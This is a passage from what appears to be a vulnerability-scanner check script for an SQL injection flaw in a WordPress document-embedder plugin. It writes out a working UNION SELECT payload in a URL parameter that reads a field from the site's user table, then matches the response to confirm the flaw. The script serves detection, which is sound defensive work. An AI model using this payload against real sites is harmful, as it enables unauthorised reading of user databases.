...
url = dir + "/wp-content/plugins/google-document-embedder/view.php?" + "embedded=1&gpid=0%20UNION%20SELECT%201,%202,%203,%20CO" + "NCAT(CAST(CHAR(97,%2058,%2049,%2058,%20123,%20115,%205" + "8,%2054,%2058,%2034,%20118,%20119,%2095,%2099,%20115,%" + "20115,%2034,%2059,%20115,%2058)%20as%20CHAR),%20LENGTH" + "(user_registered),%20CAST(CHAR(58,%2034)%20as%20CHAR)," + "%20user_registered,%20CAST(CHAR(34,%2059,%20125)%20as%" + "20CHAR))%20FROM%20%60wp_users%60%20WHERE%20ID=1";
if(http_vuln_check( port: http_port, url: url, check_header: TRUE, pattern: "<link rel=.stylesheet.*type=.*href=.[0-9]{2,4}-[0-9]{2,4}-[0-9]{2,4} [0-9][0-9]:[0-9][0-9]:[0-9][0-9].>", extra_check: make_list( ">Google Docs - Viewer<",
	 ">Viewer<" ) )){
